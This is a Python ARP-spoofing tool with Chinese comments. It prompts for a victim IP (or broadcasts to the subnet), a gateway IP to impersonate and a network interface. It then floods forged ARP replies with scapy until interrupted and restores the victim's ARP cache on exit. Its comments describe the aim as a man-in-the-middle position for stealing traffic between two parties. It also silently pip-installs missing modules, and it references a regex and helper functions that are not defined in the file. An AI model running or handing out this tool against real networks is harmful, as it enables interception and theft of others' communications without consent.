#!/usr/bin/python
# -*- coding:utf-8
import os
import sys
import time
import signal
import uuid
import logging
logging.getLogger( "scapy.runtime" ).setLevel(logging.ERROR) #清除报错

sys.path.append('..')
from common.font import *
#from common.pubOptimization import *
#防止高频调用导致堵塞，可对某些字段进行存储
Processing=str(Processing())
Information=str(Information())
Detected=str(Detected())
Result=str(Result())
Error=str(Error())

try:
    from kamene.all import *
except:
    print(Processing+'检测出您未安装kamene模块，将替您安装此模块，请稍候……')
    os.system('pip install kamene')
    from kamene.all import *
try:
    from scapy.all import *
except:
    print(Processing+'检测出您未安装random模块，将替您安装此模块，请稍候……')
    os.system('pip install scapy')
    from scapy.all import *

def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def get_mac_address():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

def arp_request(ip,ifname):
    packet = Ether(dst = 'FF:FF:FF:FF:FF:FF')/ARP(op = 1,hwdst = '00:00:00:00:00:00',pdst = ip)
    result_raw = srp(packet,timeout=2,verbose = False)
    mac = result_raw[0].res[0][1].getlayer(ARP).fields['hwsrc']
    return mac

def arp_spoof(ip_1,ip_2,ifname='ens35'):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    #赋值到全局变量
    #dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
    #local_ifname为攻击者使用的网口名字
    dst_1_ip, dst_2_ip, local_ifname= ip_1, ip_2, ifname

    # 获取本机IP和MAC地址，并且赋值到全局变量
    localip, localmac= get_ip_address(), get_mac_address()

    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
    if ip_1:
        dst_1_mac= arp_request(ip_1,ifname)
    else:#ip_1为空则广播
        dst_1_mac= 'ff:ff:ff:ff:ff:ff'
    dst_2_mac = arp_request(ip_2,ifname)

    # 引入信号处理机制，如果出现ctl c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)

    while True:  # 一直攻击，直到ctl c出现！！！
        # op=2,响应ARP
        if ip_1:
            sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip), iface=local_ifname,verbose=False)
        else:#ip_1为空则广播
            sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip), iface=local_ifname,verbose=False)
        print(Information+"发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经位本机{}的MAC地址!!!".format(ip_1 if ip_1 else '当前网段',ip_2,ifname))
        time.sleep(1)


# 定义处理方法
def sigint_handler(signum, frame):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    print('\n'+Processing+"执行恢复操作!")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
          iface=local_ifname,
          verbose=False)
    print(Result+"已经恢复 {} 的ARP缓存!".format(dst_1_ip))
    # 退出程序，跳出while True
    sys.exit()

if __name__ == "__main__":
    # 欺骗受害人,让它认为其目标的MAC地址为本机攻击者的MAC
    #如果攻击者没有路由通信就会中断，如有路由就可以窃取双方通信的信息(所谓中间人)
    isIp_1=1
    isIp_2=1
    ip_1=''
    broadcast=input('\n'+bold('是否广播arpATK：		（ Y/N	【默认N】）\n\n')+Input())
    if broadcast.lower()!='y':
        while isIp_1:
            ip_1=input('\n'+bold('请输入受害者的IP：		（例：127.0.0.1）\n\n')+Input())
            if p.match(ip_1):
                isIp_1=0
            else:
                print('\n'+Error+'IP格式错误，请重新输入……\n')
    while isIp_2:
        ip_2=input('\n'+bold('请输入被伪造的IP：		（例：127.0.0.1）\n\n')+Input())
        if p.match(ip_2):
            isIp_2=0
        else:
            print('\n'+Error+'IP格式错误，请重新输入……\n')
    iface=input('\n'+bold('请输入当前网卡名称：		（例：ens35）\n\n')+Input())
    arp_spoof(ip_1 , ip_2 , iface)